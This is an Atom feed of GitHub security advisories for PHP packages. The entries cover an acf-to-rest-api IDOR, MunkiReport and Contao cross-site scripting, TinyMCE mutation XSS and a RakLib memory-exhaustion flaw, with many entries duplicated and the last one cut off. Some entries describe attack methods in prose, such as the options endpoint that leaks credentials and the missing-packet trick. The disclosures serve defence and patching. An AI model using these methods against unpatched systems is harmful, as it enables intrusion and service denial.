<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/composer.rss</id>
    <title>Security Advisory for PHP packages hosted at packagist.org</title>
    <updated>2023-11-17T20:01:24.535Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Acomposer"/>
    <subtitle>Security Advisory for PHP packages hosted at packagist.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[airesvsg/acf-to-rest-api] acf-to-rest-api plugin insecure direct object reference (IDOR) via permalink manipulation]]></title>
        <id>https://github.com/advisories/GHSA-r345-x8hr-2r9p</id>
        <link href="https://github.com/advisories/GHSA-r345-x8hr-2r9p"/>
        <updated>2023-11-15T20:26:57.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in the acf-to-rest-api plugin through 3.1.0 for WordPress. It allows an insecure direct object reference via permalinks manipulation, as demonstrated by a <code>wp-json/acf/v3/options/</code> request that reads sensitive information in the <code>wp_options</code> table, such as the login and pass values.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-13700">https://nvd.nist.gov/vuln/detail/CVE-2020-13700</a></li>
<li><a href="https://gist.github.com/mariuszpoplwski/4fbaab7f271bea99c733e3f2a4bafbb5">https://gist.github.com/mariuszpoplwski/4fbaab7f271bea99c733e3f2a4bafbb5</a></li>
<li><a href="https://github.com/airesvsg/acf-to-rest-api">https://github.com/airesvsg/acf-to-rest-api</a></li>
<li><a href="https://wordpress.org/plugins/acf-to-rest-api/#developers">https://wordpress.org/plugins/acf-to-rest-api/#developers</a></li>
<li><a href="https://github.com/advisories/GHSA-r345-x8hr-2r9p">https://github.com/advisories/GHSA-r345-x8hr-2r9p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r345-x8hr-2r9p</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-05-24T17:21:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[munkireport/munkireport] MunkiReport Managed Installs module Reflected Cross-Site Scripting (XSS) vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-79xr-v794-wq35</id>
        <link href="https://github.com/advisories/GHSA-79xr-v794-wq35"/>
        <updated>2023-11-15T20:24:44.000Z</updated>
        <content type="html"><![CDATA[<p>A Cross-Site Scripting (XSS) vulnerability in the managedinstalls module before 2.6 for MunkiReport allows remote attackers to inject arbitrary web script or HTML via the last two URL parameters (through which installed packages names and versions are reported).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-15883">https://nvd.nist.gov/vuln/detail/CVE-2020-15883</a></li>
<li><a href="https://github.com/munkireport/managedinstalls/releases/tag/v2.6">https://github.com/munkireport/managedinstalls/releases/tag/v2.6</a></li>
<li><a href="https://github.com/munkireport/munkireport-php">https://github.com/munkireport/munkireport-php</a></li>
<li><a href="https://github.com/munkireport/munkireport-php/releases/tag/v5.6.3">https://github.com/munkireport/munkireport-php/releases/tag/v5.6.3</a></li>
<li><a href="https://github.com/munkireport/munkireport-php/wiki/20200722-Reflected-XSS-In-Managedinstalls-Module">https://github.com/munkireport/munkireport-php/wiki/20200722-Reflected-XSS-In-Managedinstalls-Module</a></li>
<li><a href="https://github.com/munkireport/managedinstalls/commit/708f6a2abc4b80a3751bcc9cf896f80d84250c55">https://github.com/munkireport/managedinstalls/commit/708f6a2abc4b80a3751bcc9cf896f80d84250c55</a></li>
<li><a href="https://github.com/advisories/GHSA-79xr-v794-wq35">https://github.com/advisories/GHSA-79xr-v794-wq35</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-79xr-v794-wq35</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-24T17:24:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[munkireport/managedinstalls] MunkiReport Managed Installs module Reflected Cross-Site Scripting (XSS) vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-79xr-v794-wq35</id>
        <link href="https://github.com/advisories/GHSA-79xr-v794-wq35"/>
        <updated>2023-11-15T20:24:44.000Z</updated>
        <content type="html"><![CDATA[<p>A Cross-Site Scripting (XSS) vulnerability in the managedinstalls module before 2.6 for MunkiReport allows remote attackers to inject arbitrary web script or HTML via the last two URL parameters (through which installed packages names and versions are reported).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-15883">https://nvd.nist.gov/vuln/detail/CVE-2020-15883</a></li>
<li><a href="https://github.com/munkireport/managedinstalls/releases/tag/v2.6">https://github.com/munkireport/managedinstalls/releases/tag/v2.6</a></li>
<li><a href="https://github.com/munkireport/munkireport-php">https://github.com/munkireport/munkireport-php</a></li>
<li><a href="https://github.com/munkireport/munkireport-php/releases/tag/v5.6.3">https://github.com/munkireport/munkireport-php/releases/tag/v5.6.3</a></li>
<li><a href="https://github.com/munkireport/munkireport-php/wiki/20200722-Reflected-XSS-In-Managedinstalls-Module">https://github.com/munkireport/munkireport-php/wiki/20200722-Reflected-XSS-In-Managedinstalls-Module</a></li>
<li><a href="https://github.com/munkireport/managedinstalls/commit/708f6a2abc4b80a3751bcc9cf896f80d84250c55">https://github.com/munkireport/managedinstalls/commit/708f6a2abc4b80a3751bcc9cf896f80d84250c55</a></li>
<li><a href="https://github.com/advisories/GHSA-79xr-v794-wq35">https://github.com/advisories/GHSA-79xr-v794-wq35</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-79xr-v794-wq35</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-24T17:24:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[munkireport/munkireport] MunkiReport Cross-Site Scripting (XSS) Filter Bypass On Comment]]></title>
        <id>https://github.com/advisories/GHSA-vc4f-2g7f-pmqr</id>
        <link href="https://github.com/advisories/GHSA-vc4f-2g7f-pmqr"/>
        <updated>2023-11-15T18:56:53.000Z</updated>
        <content type="html"><![CDATA[<p>A Cross-Site Scripting (XSS) vulnerability in the comment module before 4.0 for MunkiReport allows remote attackers to inject arbitrary web script or HTML by posting a new comment.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-15885">https://nvd.nist.gov/vuln/detail/CVE-2020-15885</a></li>
<li><a href="https://github.com/munkireport/comment/releases">https://github.com/munkireport/comment/releases</a></li>
<li><a href="https://github.com/munkireport/munkireport-php">https://github.com/munkireport/munkireport-php</a></li>
<li><a href="https://github.com/munkireport/munkireport-php/releases/tag/v5.6.3">https://github.com/munkireport/munkireport-php/releases/tag/v5.6.3</a></li>
<li><a href="https://github.com/munkireport/munkireport-php/wiki/20200722--XSS-Filter-Bypass-On-Comments">https://github.com/munkireport/munkireport-php/wiki/20200722--XSS-Filter-Bypass-On-Comments</a></li>
<li><a href="https://github.com/munkireport/managedinstalls/commit/708f6a2abc4b80a3751bcc9cf896f80d84250c55">https://github.com/munkireport/managedinstalls/commit/708f6a2abc4b80a3751bcc9cf896f80d84250c55</a></li>
<li><a href="https://github.com/advisories/GHSA-vc4f-2g7f-pmqr">https://github.com/advisories/GHSA-vc4f-2g7f-pmqr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vc4f-2g7f-pmqr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-24T17:24:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[munkireport/managedinstalls] MunkiReport Cross-Site Scripting (XSS) Filter Bypass On Comment]]></title>
        <id>https://github.com/advisories/GHSA-vc4f-2g7f-pmqr</id>
        <link href="https://github.com/advisories/GHSA-vc4f-2g7f-pmqr"/>
        <updated>2023-11-15T18:56:53.000Z</updated>
        <content type="html"><![CDATA[<p>A Cross-Site Scripting (XSS) vulnerability in the comment module before 4.0 for MunkiReport allows remote attackers to inject arbitrary web script or HTML by posting a new comment.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-15885">https://nvd.nist.gov/vuln/detail/CVE-2020-15885</a></li>
<li><a href="https://github.com/munkireport/comment/releases">https://github.com/munkireport/comment/releases</a></li>
<li><a href="https://github.com/munkireport/munkireport-php">https://github.com/munkireport/munkireport-php</a></li>
<li><a href="https://github.com/munkireport/munkireport-php/releases/tag/v5.6.3">https://github.com/munkireport/munkireport-php/releases/tag/v5.6.3</a></li>
<li><a href="https://github.com/munkireport/munkireport-php/wiki/20200722--XSS-Filter-Bypass-On-Comments">https://github.com/munkireport/munkireport-php/wiki/20200722--XSS-Filter-Bypass-On-Comments</a></li>
<li><a href="https://github.com/munkireport/managedinstalls/commit/708f6a2abc4b80a3751bcc9cf896f80d84250c55">https://github.com/munkireport/managedinstalls/commit/708f6a2abc4b80a3751bcc9cf896f80d84250c55</a></li>
<li><a href="https://github.com/advisories/GHSA-vc4f-2g7f-pmqr">https://github.com/advisories/GHSA-vc4f-2g7f-pmqr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vc4f-2g7f-pmqr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-24T17:24:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[munkireport/comment] MunkiReport Cross-Site Scripting (XSS) Filter Bypass On Comment]]></title>
        <id>https://github.com/advisories/GHSA-vc4f-2g7f-pmqr</id>
        <link href="https://github.com/advisories/GHSA-vc4f-2g7f-pmqr"/>
        <updated>2023-11-15T18:56:53.000Z</updated>
        <content type="html"><![CDATA[<p>A Cross-Site Scripting (XSS) vulnerability in the comment module before 4.0 for MunkiReport allows remote attackers to inject arbitrary web script or HTML by posting a new comment.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-15885">https://nvd.nist.gov/vuln/detail/CVE-2020-15885</a></li>
<li><a href="https://github.com/munkireport/comment/releases">https://github.com/munkireport/comment/releases</a></li>
<li><a href="https://github.com/munkireport/munkireport-php">https://github.com/munkireport/munkireport-php</a></li>
<li><a href="https://github.com/munkireport/munkireport-php/releases/tag/v5.6.3">https://github.com/munkireport/munkireport-php/releases/tag/v5.6.3</a></li>
<li><a href="https://github.com/munkireport/munkireport-php/wiki/20200722--XSS-Filter-Bypass-On-Comments">https://github.com/munkireport/munkireport-php/wiki/20200722--XSS-Filter-Bypass-On-Comments</a></li>
<li><a href="https://github.com/munkireport/managedinstalls/commit/708f6a2abc4b80a3751bcc9cf896f80d84250c55">https://github.com/munkireport/managedinstalls/commit/708f6a2abc4b80a3751bcc9cf896f80d84250c55</a></li>
<li><a href="https://github.com/advisories/GHSA-vc4f-2g7f-pmqr">https://github.com/advisories/GHSA-vc4f-2g7f-pmqr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vc4f-2g7f-pmqr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-24T17:24:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pocketmine/raklib] pocketmine/raklib reliable-ordered queue size is unlimited, allowing a session to hog server memory]]></title>
        <id>https://github.com/advisories/GHSA-w98g-5fmx-wm4x</id>
        <link href="https://github.com/advisories/GHSA-w98g-5fmx-wm4x"/>
        <updated>2023-11-15T18:42:39.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A client can send reliable-ordered packets 0, 2, 3, 4, 5 ... etc, and all the packets 2 and up will stay in the reliable-ordered queue until 1 arrives. A malicious client can exploit this to waste all available server memory by simply never sending the missing packet. Since the server doesn't make any effort to limit the size of the queue or detect this kind of abuse, this problem is easy to abuse.</p>
<h3 id="patches">Patches</h3>
<p>This bug was fixed on the 0.14.x and 0.15.x release lines by 371190f5854372154d1b263cd2a10e658e92bebe.</p>
<h3 id="workarounds">Workarounds</h3>
<p>No workaround is known.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pmmp/RakLib/security/advisories/GHSA-w98g-5fmx-wm4x">https://github.com/pmmp/RakLib/security/advisories/GHSA-w98g-5fmx-wm4x</a></li>
<li><a href="https://github.com/pmmp/RakLib/commit/371190f5854372154d1b263cd2a10e658e92bebe">https://github.com/pmmp/RakLib/commit/371190f5854372154d1b263cd2a10e658e92bebe</a></li>
<li><a href="https://github.com/advisories/GHSA-w98g-5fmx-wm4x">https://github.com/advisories/GHSA-w98g-5fmx-wm4x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w98g-5fmx-wm4x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-11-15T18:42:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pocketmine/raklib] pocketmine/raklib reliable-ordered queue size is unlimited, allowing a session to hog server memory]]></title>
        <id>https://github.com/advisories/GHSA-w98g-5fmx-wm4x</id>
        <link href="https://github.com/advisories/GHSA-w98g-5fmx-wm4x"/>
        <updated>2023-11-15T18:42:39.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A client can send reliable-ordered packets 0, 2, 3, 4, 5 ... etc, and all the packets 2 and up will stay in the reliable-ordered queue until 1 arrives. A malicious client can exploit this to waste all available server memory by simply never sending the missing packet. Since the server doesn't make any effort to limit the size of the queue or detect this kind of abuse, this problem is easy to abuse.</p>
<h3 id="patches">Patches</h3>
<p>This bug was fixed on the 0.14.x and 0.15.x release lines by 371190f5854372154d1b263cd2a10e658e92bebe.</p>
<h3 id="workarounds">Workarounds</h3>
<p>No workaround is known.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pmmp/RakLib/security/advisories/GHSA-w98g-5fmx-wm4x">https://github.com/pmmp/RakLib/security/advisories/GHSA-w98g-5fmx-wm4x</a></li>
<li><a href="https://github.com/pmmp/RakLib/commit/371190f5854372154d1b263cd2a10e658e92bebe">https://github.com/pmmp/RakLib/commit/371190f5854372154d1b263cd2a10e658e92bebe</a></li>
<li><a href="https://github.com/advisories/GHSA-w98g-5fmx-wm4x">https://github.com/advisories/GHSA-w98g-5fmx-wm4x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w98g-5fmx-wm4x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-11-15T18:42:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tinymce/tinymce] TinyMCE vulnerable to mutation Cross-site Scripting via special characters in unescaped text nodes]]></title>
        <id>https://github.com/advisories/GHSA-v626-r774-j7f8</id>
        <link href="https://github.com/advisories/GHSA-v626-r774-j7f8"/>
        <updated>2023-11-15T23:26:02.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A <a href="https://researchgate.net/publication/266654651_mXSS_attacks_Attacking_well-secured_web-applications_by_using_innerHTML_mutations">mutation cross-site scripting</a> (mXSS) vulnerability was discovered in TinyMCE’s core undo/redo functionality and other APIs and plugins. Text nodes within specific parents are not escaped upon serialization according to the <a href="https://html.spec.whatwg.org/multipage/parsing.html#serialising-html-fragments">HTML standard</a>. If such text nodes contain a special character reserved as an internal marker, they can be combined with other HTML patterns to form malicious snippets. These snippets pass the initial sanitisation layer when the content is parsed into the editor body, but can trigger XSS when the special internal marker is removed from the content and re-parsed. Such mutations occur when serialised HTML content is processed before being stored in the undo stack, or when the following APIs and plugins are used:</p>
<ul>
<li><a href="https://tiny.cloud/docs/tinymce/6/apis/tinymce.editor/#getContent"><code>tinymce.Editor.getContent({ format: 'raw' })</code></a></li>
<li><a href="https://tiny.cloud/docs/tinymce/6/apis/tinymce.editor/#resetContent"><code>tinymce.Editor.resetContent()</code></a></li>
<li><a href="https://tiny.cloud/docs/tinymce/6/autosave/">Autosave Plugin</a></li>
</ul>
<h3 id="patches">Patches</h3>
<p>This vulnerability has been patched in TinyMCE 6.7.3 by:</p>
<ul>
<li>ensuring that any unescaped text nodes which contain the special internal marker are emptied before removing the marker from the rest of the HTML, and</li>
<li>removing the special internal marker from content strings passed to <code>Editor.setContent</code>, <code>Editor.insertContent</code>, and <code>Editor.resetContent</code> APIs to prevent them from being loaded into the editor as user-provided content.</li>
</ul>
<h3 id="fix">Fix</h3>
<p>To avoid this vulnerability:</p>
<ul>
<li>Upgrade to TinyMCE 6.7.3 or higher for TinyMCE 6.x.</li>
<li>Upgrade to TinyMCE 5.10.9 or higher for TinyMCE 5.x.</li>
</ul>
<h3 id="acknowledgements">Acknowledgements</h3>
<p>Tiny Technologies would like to thank Masato Kinugawa of <a href="https://cure53.de/">Cure53</a> for discovering this vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://tiny.cloud/docs/release-notes/release-notes5109/">TinyMCE 5.10.9 Release Notes</a></li>
<li><a href="https://tiny.cloud/docs/tinymce/6/6.7.3-release-notes/">TinyMCE 6.7.3 Release Notes</a></li>
</ul>
<h3 id="for-more-information">For more information</h3>
<p>Email us at <a href="mailto:infosec@tiny.cloud">infosec@tiny.cloud</a>
Open an issue in the <a href="https://github.com/tinymce/tinymce/issues?q=is%3Aissue+is%3Aopen+sort%3Aupdated-desc">TinyMCE repo</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/tinymce/tinymce/security/advisories/GHSA-v626-r774-j7f8">https://github.com/tinymce/tinymce/security/advisories/GHSA-v626-r774-j7f8</a></li>
<li><a href="https://github.com/tinymce/tinymce/releases/tag/5.10.9">https://github.com/tinymce/tinymce/releases/tag/5.10.9</a></li>
<li><a href="https://github.com/tinymce/tinymce/releases/tag/6.7.3">https://github.com/tinymce/tinymce/releases/tag/6.7.3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-48219">https://nvd.nist.gov/vuln/detail/CVE-2023-48219</a></li>
<li><a href="https://tiny.cloud/docs/release-notes/release-notes5109/">https://tiny.cloud/docs/release-notes/release-notes5109/</a></li>
<li><a href="https://tiny.cloud/docs/tinymce/6/6.7.3-release-notes/">https://tiny.cloud/docs/tinymce/6/6.7.3-release-notes/</a></li>
<li><a href="https://github.com/advisories/GHSA-v626-r774-j7f8">https://github.com/advisories/GHSA-v626-r774-j7f8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v626-r774-j7f8</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-11-15T18:32:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tinymce/tinymce] TinyMCE vulnerable to mutation Cross-site Scripting via special characters in unescaped text nodes]]></title>
        <id>https://github.com/advisories/GHSA-v626-r774-j7f8</id>
        <link href="https://github.com/advisories/GHSA-v626-r774-j7f8"/>
        <updated>2023-11-15T23:26:02.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A <a href="https://researchgate.net/publication/266654651_mXSS_attacks_Attacking_well-secured_web-applications_by_using_innerHTML_mutations">mutation cross-site scripting</a> (mXSS) vulnerability was discovered in TinyMCE’s core undo/redo functionality and other APIs and plugins. Text nodes within specific parents are not escaped upon serialization according to the <a href="https://html.spec.whatwg.org/multipage/parsing.html#serialising-html-fragments">HTML standard</a>. If such text nodes contain a special character reserved as an internal marker, they can be combined with other HTML patterns to form malicious snippets. These snippets pass the initial sanitisation layer when the content is parsed into the editor body, but can trigger XSS when the special internal marker is removed from the content and re-parsed. Such mutations occur when serialised HTML content is processed before being stored in the undo stack, or when the following APIs and plugins are used:</p>
<ul>
<li><a href="https://tiny.cloud/docs/tinymce/6/apis/tinymce.editor/#getContent"><code>tinymce.Editor.getContent({ format: 'raw' })</code></a></li>
<li><a href="https://tiny.cloud/docs/tinymce/6/apis/tinymce.editor/#resetContent"><code>tinymce.Editor.resetContent()</code></a></li>
<li><a href="https://tiny.cloud/docs/tinymce/6/autosave/">Autosave Plugin</a></li>
</ul>
<h3 id="patches">Patches</h3>
<p>This vulnerability has been patched in TinyMCE 6.7.3 by:</p>
<ul>
<li>ensuring that any unescaped text nodes which contain the special internal marker are emptied before removing the marker from the rest of the HTML, and</li>
<li>removing the special internal marker from content strings passed to <code>Editor.setContent</code>, <code>Editor.insertContent</code>, and <code>Editor.resetContent</code> APIs to prevent them from being loaded into the editor as user-provided content.</li>
</ul>
<h3 id="fix">Fix</h3>
<p>To avoid this vulnerability:</p>
<ul>
<li>Upgrade to TinyMCE 6.7.3 or higher for TinyMCE 6.x.</li>
<li>Upgrade to TinyMCE 5.10.9 or higher for TinyMCE 5.x.</li>
</ul>
<h3 id="acknowledgements">Acknowledgements</h3>
<p>Tiny Technologies would like to thank Masato Kinugawa of <a href="https://cure53.de/">Cure53</a> for discovering this vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://tiny.cloud/docs/release-notes/release-notes5109/">TinyMCE 5.10.9 Release Notes</a></li>
<li><a href="https://tiny.cloud/docs/tinymce/6/6.7.3-release-notes/">TinyMCE 6.7.3 Release Notes</a></li>
</ul>
<h3 id="for-more-information">For more information</h3>
<p>Email us at <a href="mailto:infosec@tiny.cloud">infosec@tiny.cloud</a>
Open an issue in the <a href="https://github.com/tinymce/tinymce/issues?q=is%3Aissue+is%3Aopen+sort%3Aupdated-desc">TinyMCE repo</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/tinymce/tinymce/security/advisories/GHSA-v626-r774-j7f8">https://github.com/tinymce/tinymce/security/advisories/GHSA-v626-r774-j7f8</a></li>
<li><a href="https://github.com/tinymce/tinymce/releases/tag/5.10.9">https://github.com/tinymce/tinymce/releases/tag/5.10.9</a></li>
<li><a href="https://github.com/tinymce/tinymce/releases/tag/6.7.3">https://github.com/tinymce/tinymce/releases/tag/6.7.3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-48219">https://nvd.nist.gov/vuln/detail/CVE-2023-48219</a></li>
<li><a href="https://tiny.cloud/docs/release-notes/release-notes5109/">https://tiny.cloud/docs/release-notes/release-notes5109/</a></li>
<li><a href="https://tiny.cloud/docs/tinymce/6/6.7.3-release-notes/">https://tiny.cloud/docs/tinymce/6/6.7.3-release-notes/</a></li>
<li><a href="https://github.com/advisories/GHSA-v626-r774-j7f8">https://github.com/advisories/GHSA-v626-r774-j7f8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v626-r774-j7f8</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-11-15T18:32:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[contao/core-bundle] Cross site scripting via input unit widget]]></title>
        <id>https://github.com/advisories/GHSA-4gpr-p634-922x</id>
        <link href="https://github.com/advisories/GHSA-4gpr-p634-922x"/>
        <updated>2023-11-15T18:13:00.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Authenticated users can inject malicious code in widgets with units, which is then executed both in the element preview (back end) and on the website (front end).</p>
<h3 id="patches">Patches</h3>
<p>Update to Contao 4.9.42, 4.13.28 or 5.1.10. </p>
<h3 id="workarounds">Workarounds</h3>
<p>Disable login for all untrusted back end users.</p>
<h3 id="references">References</h3>
<p><a href="https://contao.org/en/security-advisories/cross-site-scripting-in-widgets-with-units">https://contao.org/en/security-advisories/cross-site-scripting-in-widgets-with-units</a></p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory, open an issue in <a href="https://github.com/contao/contao/issues/new/choose">contao/contao</a>.</p>
<h3 id="credits">Credits</h3>
<p>Thanks to Christian Pöschl and Fabian Brenner from usd AG for reporting this vulnerability.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/contao/contao/security/advisories/GHSA-4gpr-p634-922x">https://github.com/contao/contao/security/advisories/GHSA-4gpr-p634-922x</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-36806">https://nvd.nist.gov/vuln/detail/CVE-2023-36806</a></li>
<li><a href="https://github.com/contao/contao/commit/5c9aff32cfc1f7dc452a045862ac2f86a6b9b4b4">https://github.com/contao/contao/commit/5c9aff32cfc1f7dc452a045862ac2f86a6b9b4b4</a></li>
<li><a href="https://github.com/contao/contao/commit/c98585d36baa25fda69c062421e7e7eadc53c82b">https://github.com/contao/contao/commit/c98585d36baa25fda69c062421e7e7eadc53c82b</a></li>
<li><a href="https://github.com/contao/contao/commit/ccb64c777eb0f9c0e6490c9135d80e915d37cd32">https://github.com/contao/contao/commit/ccb64c777eb0f9c0e6490c9135d80e915d37cd32</a></li>
<li><a href="https://herolab.usd.de/security-advisories/usd-2023-0020/">https://herolab.usd.de/security-advisories/usd-2023-0020/</a></li>
<li><a href="https://github.com/advisories/GHSA-4gpr-p634-922x">https://github.com/advisories/GHSA-4gpr-p634-922x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4gpr-p634-922x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-07-25T17:19:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[contao/core-bundle] Cross site scripting via input unit widget]]></title>
        <id>https://github.com/advisories/GHSA-4gpr-p634-922x</id>
        <link href="https://github.com/advisories/GHSA-4gpr-p634-922x"/>
        <updated>2023-11-15T18:13:00.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Authenticated users can inject malicious code in widgets with units, which is then executed both in the element preview (back end) and on the website (front end).</p>
<h3 id="patches">Patches</h3>
<p>Update to Contao 4.9.42, 4.13.28 or 5.1.10. </p>
<h3 id="workarounds">Workarounds</h3>
<p>Disable login for all untrusted back end users.</p>
<h3 id="references">References</h3>
<p><a href="https://contao.org/en/security-advisories/cross-site-scripting-in-widgets-with-units">https://contao.org/en/security-advisories/cross-site-scripting-in-widgets-with-units</a></p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory, open an issue in <a href="https://github.com/contao/contao/issues/new/choose">contao/contao</a>.</p>
<h3 id="credits">Credits</h3>
<p>Thanks to Christian Pöschl and Fabian Brenner from usd AG for reporting this vulnerability.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/contao/contao/security/advisories/GHSA-4gpr-p634-922x">https://github.com/contao/contao/security/advisories/GHSA-4gpr-p634-922x</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-36806">https://nvd.nist.gov/vuln/detail/CVE-2023-36806</a></li>
<li><a href="https://github.com/contao/contao/commit/5c9aff32cfc1f7dc452a045862ac2f86a6b9b4b4">https://github.com/contao/contao/commit/5c9aff32cfc1f7dc452a045862ac2f86a6b9b4b4</a></li>
<li><a href="https://github.com/contao/contao/commit/c98585d36baa25fda69c062421e7e7eadc53c82b">https://github.com/contao/contao/commit/c98585d36baa25fda69c062421e7e7eadc53c82b</a></li>
<li><a href="https://github.com/contao/contao/commit/ccb64c777eb0f9c0e6490c9135d80e915d37cd32">https://github.com/contao/contao/commit/ccb64c777eb0f9c0e6490c9135d80e915d37cd32</a></li>
<li><a href="https://herolab.usd.de/security-advisories/usd-2023-0020/">https://herolab.usd.de/security-advisories/usd-2023-0020/</a></li>
<li><a href="https://github.com/advisories/GHSA-4gpr-p634-922x">https://github.com/advisories/GHSA-4gpr-p634-922x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4gpr-p634-922x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-07-25T17:19:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[contao/core-bundle] Cross site scripting via input unit widget]]></title>
        <id>https://github.com/advisories/GHSA-4gpr-p634-922x</id>
        <link href="https://github.com/advisories/GHSA-4gpr-p634-922x"/>
        <updated>2023-11-15T18:13:00.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Authenticated users can inject malicious code in widgets with units, which is then executed both in the element preview (back end) and on the website (front end).</p>
<h3 id="patches">Patches</h3>
<p>Update to Contao 4.9.42, 4.13.28 or 5.1.10. </p>
<h3 id="workarounds">Workarounds</h3>
<p>Disable login for all untrusted back end users.</p>
<h3 id="references">References</h3>
<p><a href="https://contao.org/en/security-advisories/cross-site-scripting-in-widgets-with-units">https://contao.org/en/security-advisories/cross-site-scripting-in-widgets-with-units</a></p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory, open an issue in <a href="https://github.com/contao/contao/issues/new/choose">contao/contao</a>.</p>
<h3 id="credits">Credits</h3>
<p>Thanks to Christian Pöschl and Fabian Brenner from usd AG for reporting this vulnerability.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/contao/contao/security/advisories/GHSA-4gpr-p634-922x">https://github.com/contao/contao/security/advisories/GHSA-4gpr-p634-922x</a></li>
